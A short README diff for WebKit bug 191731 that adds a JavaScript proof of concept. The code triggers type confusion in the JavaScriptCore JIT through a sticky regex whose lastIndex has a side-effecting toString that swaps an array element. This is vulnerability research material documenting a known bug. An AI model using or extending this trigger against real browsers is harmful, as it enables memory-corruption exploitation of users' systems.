@@ -1,4 +1,30 @@
 # BUG 191731
+## POC
+
+```javascript
+var victim_array = [1.1];
+var reg = /abc/y;
+var val = 5.2900040263529e-310
+
+var funcToJIT = function() {
+    'abc'.match(reg);
+    victim_array[0] = val;
+}
+
+for (var i = 0; i < 10000; ++i){
+    funcToJIT()
+}
+
+regexLastIndex = {};
+regexLastIndex.toString = function() {
+    victim_array[0] = {};
+    return "0";
+};
+reg.lastIndex = regexLastIndex;
+funcToJIT()
+print(victim_array[0])
+```
+
 ## About the bug
 https://bugs.webkit.org/show_bug.cgi?id=191731
 ## Diff
